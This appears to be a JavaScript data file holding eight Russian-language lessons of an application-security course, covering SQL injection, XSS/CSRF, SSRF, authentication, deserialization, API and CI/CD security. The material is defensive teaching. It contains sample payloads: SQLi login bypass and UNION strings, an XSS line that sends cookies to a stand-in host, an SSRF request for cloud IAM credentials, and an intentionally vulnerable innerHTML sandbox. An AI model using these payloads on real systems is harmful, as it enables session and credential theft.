// Семестр 5: Безопасность приложений
const SEMESTER_5 = (function() {
    function L(id, title, type, content) { return { id, title, type, content }; }
    function makeContent(semNum, lessonNum, title, bodyHTML, sources) {
        const src = sources ? `<div class="source-block"><h4><i class="fas fa-book"></i> Источники</h4><ul>${sources.map(s=>`<li>${s}</li>`).join('')}</ul></div>` : '';
        return `<h1>Урок ${semNum}.${lessonNum}: ${title}</h1>${bodyHTML}${src}`;
    }
    const lessons = [];

    // 5.1
    lessons.push(L("5.1", "SQL-инъекции", "web", makeContent(5, 1, "SQL-инъекции", `
<div class="theory-block"><h3>Суть уязвимости</h3>
<p><span class="definition">SQL-инъекция</span> возникает, когда пользовательский ввод попадает в текст SQL-запроса без должной обработки, позволяя злоумышленнику изменить логику запроса. Несмотря на возраст (класс известен с конца 90-х), инъекции стабильно входят в OWASP Top 10 — потому что легаси-код, самописные ORM-обёртки и «быстрые» правки без ревью продолжают их порождать.</p></div>

<div class="lesson-card"><h3>Классический пример</h3>
<pre data-lang="php"><code>// Уязвимый код
$query = "SELECT * FROM users WHERE login = '" . $_POST['login'] . "' AND pass = '" . $_POST['pass'] . "'";
// Ввод в поле login: admin' -- 
// Итоговый запрос:
// SELECT * FROM users WHERE login = 'admin' -- ' AND pass = '...'
// Всё после -- считается комментарием — проверка пароля отброшена</code></pre>
<p>Более разрушительный вариант — <code>' UNION SELECT username, password FROM users --</code>, позволяющий вытащить данные из произвольной таблицы, если структура запроса это допускает.</p>
</div>

<div class="lesson-card"><h3>Виды SQL-инъекций</h3>
<table><tr><th>Тип</th><th>Как работает</th></tr>
<tr><td>In-band (classic)</td><td>результат виден прямо в ответе приложения</td></tr>
<tr><td>Blind (boolean-based)</td><td>ответ приложения меняется (да/нет), данные восстанавливают побитово через десятки запросов</td></tr>
<tr><td>Blind (time-based)</td><td>используется задержка (<code>SLEEP()</code>), различие определяется по времени ответа</td></tr>
<tr><td>Out-of-band</td><td>данные эксфильтруются через другой канал — DNS-запрос, HTTP-callback</td></tr>
</table>
</div>

<div class="theory-block"><h3>Единственно верная защита — параметризация</h3>
<p>Правильное решение — не «фильтрация» пользовательского ввода, а <b>параметризованные запросы (prepared statements)</b>, где данные никогда не смешиваются с текстом SQL-команды на уровне синтаксиса драйвера БД.</p>
<pre data-lang="php"><code>// Безопасный вариант (PDO, PHP)
$stmt = $pdo->prepare("SELECT * FROM users WHERE login = ? AND pass_hash = ?");
$stmt->execute([$login, hash('sha256', $password)]);</code></pre>
<p>Дополнительные слои: принцип наименьших привилегий для учётной записи БД (нет причин, чтобы веб-приложение могло выполнять <code>DROP TABLE</code>), WAF как компенсирующий контроль, но не замена параметризации.</p></div>
`, ["OWASP SQL Injection Prevention Cheat Sheet", "OWASP Testing Guide v4, раздел WSTG-INPV-05", "portswigger.net/web-security/sql-injection"])));

    // 5.2
    lessons.push(L("5.2", "XSS и CSRF", "web", makeContent(5, 2, "XSS и CSRF", `
<div class="theory-block"><h3>XSS — межсайтовый скриптинг</h3>
<p><span class="definition">XSS</span> позволяет злоумышленнику выполнить произвольный JavaScript в браузере жертвы в контексте доверенного сайта — то есть с доступом к его cookie, localStorage, DOM и возможностью выполнять запросы от имени залогиненного пользователя.</p></div>

<div class="lesson-card"><h3>Три классических вида XSS</h3>
<table><tr><th>Вид</th><th>Где хранится payload</th></tr>
<tr><td>Stored (persistent)</td><td>сохраняется на сервере (комментарий, профиль) и выполняется у каждого посетителя страницы</td></tr>
<tr><td>Reflected</td><td>приходит в самом запросе (параметр URL) и тут же отражается в ответе без сохранения</td></tr>
<tr><td>DOM-based</td><td>уязвимость целиком на клиенте — JS сам небезопасно вставляет данные из URL/DOM в разметку</td></tr>
</table>
<pre data-lang="html"><code>&lt;!-- Пример уязвимого поиска: параметр q отражается без экранирования --&gt;
&lt;p&gt;Результаты по запросу: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;
&lt;!-- Атака: ?q=&lt;script&gt;fetch('https://evil.tld/steal?c='+document.cookie)&lt;/script&gt; --&gt;</code></pre>
</div>

<div class="theory-block"><h3>Защита от XSS</h3>
<p>Главное правило — <b>контекстное экранирование вывода</b>: то, что безопасно вставлять в текст HTML, небезопасно вставлять в атрибут или в блок <code>&lt;script&gt;</code>, и наоборот. Современные фреймворки (React, Vue, Angular) по умолчанию экранируют вставляемые данные — большинство XSS в таких приложениях возникает именно там, где разработчик осознанно обходит эту защиту (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>). Дополнительный барьер — заголовок <b>Content-Security-Policy</b>, ограничивающий источники исполняемого JS.</p></div>

<div class="lesson-card"><h3>CSRF — подделка межсайтовых запросов</h3>
<p><span class="definition">CSRF</span> заставляет браузер жертвы, уже авторизованной на сайте, незаметно отправить запрос от её имени (например, открыв вредоносную страницу с автоотправляющейся формой). Работает потому, что браузер автоматически прикладывает cookie сессии к любому запросу на домен, независимо от того, с какой страницы он инициирован.</p>
<p><b>Защита:</b> CSRF-токен, уникальный для сессии/формы и не предсказуемый извне; атрибут cookie <code>SameSite=Lax/Strict</code>, ограничивающий отправку cookie в кросс-доменных запросах; проверка заголовка <code>Origin</code>/<code>Referer</code> для чувствительных действий.</p>
</div>

<div class="example-block"><h4>🧪 Практика: попробуй сам</h4>
<p>Ниже — живая песочница. В HTML-вкладке уже есть поле поиска, которое небезопасно вставляет ввод пользователя в DOM через <code>innerHTML</code> (JS-вкладка). Введи в поле <code>&lt;img src=x onerror=alert(1)&gt;</code> и нажми «Искать» в превью — увидишь, как выполняется чужой JS. Затем попробуй исправить JS-код так, чтобы использовать <code>textContent</code> вместо <code>innerHTML</code>, и убедись, что атака перестала срабатывать.</p>
${ideBlock({
  id: 'ide-xss-demo',
  mode: 'web',
  label: 'Песочница: уязвимый поиск (XSS) — попробуй атаковать и починить',
  html: '<input id="q" placeholder="Введи поисковый запрос..." style="padding:8px;width:70%;">\\n<button onclick="search()">Искать</button>\\n<div id="result" style="margin-top:12px;padding:10px;background:#eee;"></div>',
  css: 'body{font-family:sans-serif;padding:10px;}',
  js: '// Уязвимо: innerHTML вставляет ввод пользователя как разметку\\nfunction search() {\\n  var q = document.getElementById("q").value;\\n  document.getElementById("result").innerHTML = "Результаты по запросу: " + q;\\n}\\n\\n// Попробуй заменить строку выше на:\\n// document.getElementById("result").textContent = "Результаты по запросу: " + q;'
})}
</div>
`, ["OWASP Cross Site Scripting Prevention Cheat Sheet", "OWASP CSRF Prevention Cheat Sheet", "MDN — Content-Security-Policy"])));

    // 5.3
    lessons.push(L("5.3", "OWASP Top 10 и SSRF", "web", makeContent(5, 3, "OWASP Top 10 и SSRF", `
<div class="theory-block"><h3>OWASP Top 10 — язык индустрии</h3>
<p>OWASP Top 10 — регулярно обновляемый список наиболее критичных классов уязвимостей веб-приложений, формируемый на основе данных от десятков организаций. Это не научная таксономия, а практический ориентир: на что в первую очередь смотреть при аудите и куда направлять бюджет защиты.</p></div>

<div class="lesson-card"><h3>Ключевые категории (редакция 2021)</h3>
<table><tr><th>№</th><th>Категория</th><th>Суть</th></tr>
<tr><td>A01</td><td>Broken Access Control</td><td>пользователь получает доступ к чужим данным/действиям (IDOR, отсутствие проверки прав)</td></tr>
<tr><td>A02</td><td>Cryptographic Failures</td><td>слабое/отсутствующее шифрование чувствительных данных</td></tr>
<tr><td>A03</td><td>Injection</td><td>SQL/NoSQL/OS command/LDAP-инъекции</td></tr>
<tr><td>A05</td><td>Security Misconfiguration</td><td>дефолтные пароли, лишние сервисы, подробные ошибки в проде</td></tr>
<tr><td>A08</td><td>Software and Data Integrity Failures</td><td>небезопасные обновления/CI-CD пайплайны, недоверенные зависимости</td></tr>
<tr><td>A10</td><td>SSRF</td><td>сервер заставляют выполнить запрос туда, куда решает атакующий</td></tr>
</table>
</div>

<div class="warning-block"><h3>SSRF — Server-Side Request Forgery</h3>
<p>SSRF возникает, когда приложение по запросу пользователя обращается к произвольному URL (загрузка превью, webhook, импорт по ссылке) без ограничения адресата. Атакующий подставляет внутренний адрес — например, метаданные облачного провайдера (<code>http://169.254.169.254/</code> в AWS/GCP/Azure), получая временные учётные данные IAM-роли сервера, или адреса внутренней сети, недоступные снаружи напрямую.</p>
<pre data-lang="text"><code>POST /fetch-preview
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
<p><b>Защита:</b> allow-list разрешённых доменов/протоколов, запрет резолва в приватные и link-local диапазоны на сетевом уровне, отдельный сегмент сети без доступа к метаданным облака для сервисов, выполняющих внешние запросы по указке пользователя.</p></div>
`, ["OWASP Top 10:2021", "OWASP SSRF Prevention Cheat Sheet", "portswigger.net/web-security/ssrf"])));

    // 5.4
    lessons.push(L("5.4", "Сетевая защита периметра: IDS/IPS, WAF, VPN", "web", makeContent(5, 4, "Сетевая защита периметра: IDS/IPS, WAF, VPN", `
<div class="theory-block"><h3>Эшелонированная защита</h3>
<p>Ни один защитный механизм не работает как единственная линия обороны — это принцип <span class="definition">defense in depth</span>. Сетевой периметр обычно строится из нескольких взаимно дополняющих слоёв: фильтрация трафика, обнаружение атак, специализированная защита веб-уровня, защищённые каналы для удалённого доступа.</p></div>

<div class="lesson-card"><h3>IDS vs IPS</h3>
<p><b>IDS</b> (Intrusion Detection System) анализирует трафик или события в системе и <i>сигнализирует</i> об атаке (пассивно — копия трафика, не в разрыв канала). <b>IPS</b> (Intrusion Prevention System) работает в разрыв канала и может <i>активно блокировать</i> обнаруженный вредоносный трафик. Обнаружение строится на двух подходах: сигнатурном (известные паттерны атак — быстро, но не ловит новое) и аномальном/поведенческом (отклонение от baseline — ловит неизвестные атаки, но даёт больше ложных срабатываний).</p>
</div>

<div class="lesson-card"><h3>WAF — Web Application Firewall</h3>
<p>WAF работает на уровне HTTP(S) и понимает семантику веб-запросов — в отличие от классического сетевого фаервола, который видит только IP/порты. WAF фильтрует типичные атакующие паттерны (сигнатуры SQLi/XSS, аномальные заголовки, rate limiting) и часто разворачивается как reverse-proxy перед приложением или как управляемый облачный сервис (Cloudflare, AWS WAF). <b>Важно:</b> WAF — компенсирующий контроль, а не замена безопасной разработки: он снижает риск, но не устраняет первопричину уязвимости в коде.</p>
</div>

<div class="lesson-card"><h3>VPN и защищённый удалённый доступ</h3>
<p>VPN создаёт зашифрованный туннель поверх недоверенной сети (интернета), логически расширяя защищённый периметр до удалённого устройства. Основные протоколы: <b>IPsec</b> (работает на сетевом уровне, часто site-to-site), <b>OpenVPN</b> (гибкий, TLS-based), <b>WireGuard</b> (современный, компактный код, высокая производительность, всё более популярный выбор по умолчанию).</p>
<p>Модель «замок и ров» (доверяй всему внутри периметра после VPN-подключения) постепенно вытесняется моделью <b>Zero Trust</b> — где каждый запрос проверяется по идентичности и контексту независимо от того, откуда он пришёл, включая «изнутри» сети.</p>
</div>
`, ["NIST SP 800-94 (Guide to Intrusion Detection and Prevention Systems)", "OWASP Virtual Patching Best Practices", "WireGuard — Whitepaper, J. A. Donenfeld"])));

    // 5.5
    lessons.push(L("5.5", "Аутентификация и управление сессиями", "web", makeContent(5, 5, "Аутентификация и управление сессиями", `
<div class="theory-block"><h3>Аутентификация vs авторизация</h3>
<p><span class="definition">Аутентификация</span> отвечает на вопрос «кто ты?», <span class="definition">авторизация</span> — «что тебе разрешено?». Смешение этих понятий в архитектуре приложения — источник целого класса уязвимостей, когда проверка личности подменяет собой отдельную, обязательную проверку прав на конкретное действие.</p></div>

<div class="lesson-card"><h3>Хранение паролей</h3>
<p>Пароль никогда не хранится в открытом виде и никогда не шифруется обратимо — он <b>хешируется</b> специализированной медленной функцией (<code>bcrypt</code>, <code>scrypt</code>, <code>Argon2</code>), намеренно требующей значительных вычислительных ресурсов, чтобы затруднить перебор при утечке базы. Обычные быстрые хеши общего назначения (MD5, SHA-256 без соли и итераций) для паролей непригодны — их перебирают миллиардами в секунду на GPU.</p>
<pre data-lang="text"><code># Плохо: sha256(password) — быстро перебирается
# Хорошо: Argon2id(password, salt, memory_cost, iterations)</code></pre>
</div>

<div class="lesson-card"><h3>Управление сессиями</h3>
<p>После успешной аутентификации сервер выдаёт клиенту session token (обычно через <code>httpOnly</code>, <code>Secure</code>, <code>SameSite</code> cookie) либо самодостаточный JWT. Ключевые требования: непредсказуемая генерация идентификатора сессии (криптостойкий ГПСЧ), инвалидация на сервере при logout, ограниченное время жизни, ротация ID сессии после смены уровня привилегий (например, после логина), защита от <b>session fixation</b> (когда атакующий подсовывает жертве заранее известный ID сессии).</p>
</div>

<div class="warning-block"><h3>Многофакторная аутентификация (MFA)</h3>
<p>MFA требует подтверждения второго независимого фактора (что-то, что у пользователя есть — TOTP-приложение, аппаратный ключ FIDO2/WebAuthn; или что-то, чем он является — биометрия) в дополнение к паролю. SMS как второй фактор считается наименее надёжным вариантом из-за атак <b>SIM swapping</b> — предпочтительны TOTP-приложения (Google Authenticator, Authy) или аппаратные ключи (YubiKey), устойчивые к фишингу за счёт привязки к домену.</p></div>
`, ["OWASP Authentication Cheat Sheet", "OWASP Session Management Cheat Sheet", "NIST SP 800-63B (Digital Identity Guidelines)"])));

    // 5.6
    lessons.push(L("5.6", "Небезопасная десериализация и атаки на зависимости", "web", makeContent(5, 6, "Небезопасная десериализация и атаки на зависимости", `
<div class="theory-block"><h3>Данные, которые становятся кодом</h3>
<p><span class="definition">Десериализация</span> — процесс восстановления объекта из последовательности байтов (JSON, XML, бинарные форматы вроде Java Serializable, Python pickle, PHP serialize). Когда приложение десериализует данные, пришедшие от недоверенного источника, без строгой валидации, атакующий может сконструировать вредоносный сериализованный объект, который при восстановлении выполнит произвольный код (RCE) — это входит в OWASP Top 10.</p></div>

<div class="lesson-card"><h3>Опасные форматы по языкам</h3>
<table><tr><th>Язык</th><th>Опасный механизм</th><th>Безопасная альтернатива</th></tr>
<tr><td>Python</td><td><code>pickle.loads()</code> на недоверенных данных</td><td>JSON для данных без недоверенного кода</td></tr>
<tr><td>Java</td><td><code>ObjectInputStream.readObject()</code></td><td>белые списки классов, JSON/Jackson с ограничениями</td></tr>
<tr><td>PHP</td><td><code>unserialize()</code></td><td><code>json_decode()</code></td></tr>
<tr><td>.NET</td><td><code>BinaryFormatter</code></td><td>System.Text.Json с ограниченными типами</td></tr>
</table>
<p>Известные реальные инциденты: цепочки гаджетов (<b>gadget chains</b>) в популярных Java-библиотеках (Apache Commons Collections) позволяли достичь RCE через десериализацию без единой явно «уязвимой» строчки кода в самом приложении — уязвимость была в комбинации легитимных классов из зависимостей.</p>
</div>

<div class="lesson-card"><h3>Атаки на цепочку поставок (supply chain)</h3>
<p>Современное приложение — это в среднем сотни транзитивных зависимостей (npm, pip, Maven). Компрометация даже одного второстепенного пакета в этой цепочке (через захват аккаунта мейнтейнера, тайпсквоттинг похожих имён пакетов, внедрение вредоносного кода в обновление) даёт атакующему доступ ко всем проектам, которые эту зависимость используют — инцидент SolarWinds (2020) и атака через пакет <code>event-stream</code> в npm — показательные примеры этого класса.</p>
</div>

<div class="warning-block"><h3>Практика защиты</h3>
<p>Никогда не десериализуйте объекты произвольного типа из недоверенного источника; используйте безопасные форматы (JSON/Protobuf со строгой схемой) вместо нативной сериализации языка; проверяйте зависимости через SCA-инструменты (Dependency-Check, Snyk, npm audit); фиксируйте версии зависимостей и хеши (lock-файлы); используйте <b>SBOM (Software Bill of Materials)</b> для видимости всей цепочки компонентов.</p></div>
`, ["OWASP Top 10 — A08:2021 Software and Data Integrity Failures", "OWASP Deserialization Cheat Sheet", "«The Anatomy of a Software Supply Chain Attack», ENISA report"])));

    // 5.7
    lessons.push(L("5.7", "API-безопасность и OWASP API Top 10", "web", makeContent(5, 7, "API-безопасность и OWASP API Top 10", `
<div class="theory-block"><h3>API как самостоятельная поверхность атаки</h3>
<p>Современные приложения — это в первую очередь REST/GraphQL API, потребляемые мобильными клиентами, SPA-фронтендами и другими сервисами. API имеет свою специфику атак, отличную от классических веб-форм, поэтому OWASP выпускает отдельный рейтинг — <b>OWASP API Security Top 10</b>.</p></div>

<div class="lesson-card"><h3>Ключевые категории OWASP API Top 10</h3>
<table><tr><th>Категория</th><th>Суть</th></tr>
<tr><td>BOLA (Broken Object Level Authorization)</td><td>пользователь может обратиться к чужому объекту, поменяв ID в запросе (<code>/api/orders/1234</code> → <code>1235</code>)</td></tr>
<tr><td>Broken Authentication</td><td>слабая реализация токенов, отсутствие ограничения попыток входа</td></tr>
<tr><td>BOPLA (Broken Object Property Level Authorization)</td><td>API возвращает или принимает больше полей объекта, чем должно быть доступно роли пользователя (mass assignment)</td></tr>
<tr><td>Unrestricted Resource Consumption</td><td>отсутствие лимитов на размер запроса, пагинацию, частоту вызовов (rate limiting)</td></tr>
<tr><td>Broken Function Level Authorization</td><td>обычный пользователь может вызвать административный эндпоинт, не предназначенный для его роли</td></tr>
</table>
</div>

<div class="lesson-card"><h3>BOLA на практике</h3>
<p>BOLA (также известна как IDOR — Insecure Direct Object Reference — применительно к API) — самая распространённая категория в реальных отчётах об уязвимостях API. Пример: эндпоинт <code>GET /api/users/{id}/invoices</code> проверяет, что пользователь аутентифицирован, но не проверяет, что запрошенный <code>{id}</code> принадлежит именно этому пользователю. Простая замена числа в URL раскрывает данные любого другого пользователя.</p>
<pre data-lang="text"><code># Уязвимо: только проверка "залогинен ли пользователь"
GET /api/users/1235/invoices  -> должен вернуть 403, если 1235 != текущий пользователь</code></pre>
</div>

<div class="warning-block"><h3>GraphQL: специфичные риски</h3>
<p>GraphQL даёт клиенту гибкость самому формировать запрос, что порождает свои риски: чрезмерно глубокие вложенные запросы (<b>query depth attack</b>) как вектор DoS, раскрытие всей схемы через <b>introspection</b> в продакшене (полезно для разработки, опасно как «карта API» для атакующего), избыточное возвращение данных, если авторизация проверяется не на уровне каждого resolver-а, а только на уровне всего запроса.</p></div>
`, ["OWASP API Security Top 10 (2023)", "OWASP GraphQL Cheat Sheet", "Corey J. Ball «Hacking APIs», No Starch Press"])));

    // 5.8
    lessons.push(L("5.8", "Безопасность CI/CD и контейнерных образов", "web", makeContent(5, 8, "Безопасность CI/CD и контейнерных образов", `
<div class="theory-block"><h3>Конвейер доставки — тоже инфраструктура, требующая защиты</h3>
<p>CI/CD-конвейер (сборка, тестирование, деплой) имеет привилегированный доступ к исходному коду, секретам (ключи API, пароли БД) и продакшен-инфраструктуре. Компрометация конвейера часто опаснее компрометации одного сервера — она даёт атакующему возможность внедрить вредоносный код прямо в легитимный релиз продукта, который автоматически развернётся у всех пользователей.</p></div>

<div class="lesson-card"><h3>Секреты в CI/CD</h3>
<p>Частая ошибка — хранение токенов, паролей и ключей API прямо в конфигурации пайплайна или в переменных окружения без ограничения видимости. Правильная практика: выделенное хранилище секретов (Vault, GitHub/GitLab CI secrets, AWS Secrets Manager) с ограниченным по времени и по scope доступом, отдельные учётные данные для каждого окружения (dev/staging/prod), ротация после любого подозрения на утечку.</p>
<pre data-lang="yaml"><code># Плохо — секрет виден в логах и истории репозитория
env:
  DB_PASSWORD: "SuperSecret123"
# Хорошо — секрет подтягивается из защищённого хранилища во время выполнения
env:
  DB_PASSWORD: \${{ secrets.DB_PASSWORD }}</code></pre>
</div>

<div class="lesson-card"><h3>Безопасность контейнерных образов</h3>
<p>Публичные базовые образы (Docker Hub) могут содержать устаревшие пакеты с известными CVE или, в редких случаях, быть намеренно скомпрометированы. Практика защиты: использование минималистичных базовых образов (distroless, Alpine), сканирование образов на уязвимости на этапе сборки (Trivy, Grype, Snyk Container), подписание образов (Sigstore/Cosign) и проверка подписи перед деплоем, регулярное пересобирание образов для подтягивания security-патчей даже без изменений в собственном коде.</p></div>

<div class="warning-block"><h3>Принцип наименьших привилегий в конвейере</h3>
<p>CI/CD-раннер, которому для деплоя одного микросервиса выданы права администратора всего облачного аккаунта — классическая избыточная привилегия. При компрометации такого раннера (через уязвимую зависимость сборки или вредоносный pull request от внешнего контрибьютора) атакующий получает контроль над всей инфраструктурой, а не только над одним сервисом. Каждому этапу пайплайна — минимально необходимый набор прав, изолированные учётные записи сервисов, обязательное ревью для пайплайнов, запускаемых от pull request-ов из форков.</p></div>
`, ["OWASP CI/CD Security Top 10", "«Container Security» L. Rice, гл. 8-9", "SLSA Framework — Supply-chain Levels for Software Artifacts"])));

    return { id: 5, title: "🌐 Безопасность приложений", motto: "Защита периметра", lessons: lessons,
        literature: [
            "OWASP Testing Guide v4",
            "Stuttard D., Pinto M. «The Web Application Hacker's Handbook», 2nd ed.",
            "Anderson R. «Security Engineering», 3rd ed."
        ],
        links: [
            {t: "🕷️ PortSwigger Web Security Academy — бесплатные лаборатории", u: "https://portswigger.net/web-security"},
            {t: "📋 OWASP Cheat Sheet Series", u: "https://cheatsheetseries.owasp.org/"},
            {t: "🎯 OWASP Juice Shop — учебное уязвимое приложение", u: "https://owasp.org/www-project-juice-shop/"}
        ]
    };
})();
if (!window.__KERNEL_SEMESTERS) window.__KERNEL_SEMESTERS = [];
window.__KERNEL_SEMESTERS.push({ id: 5, data: SEMESTER_5 });
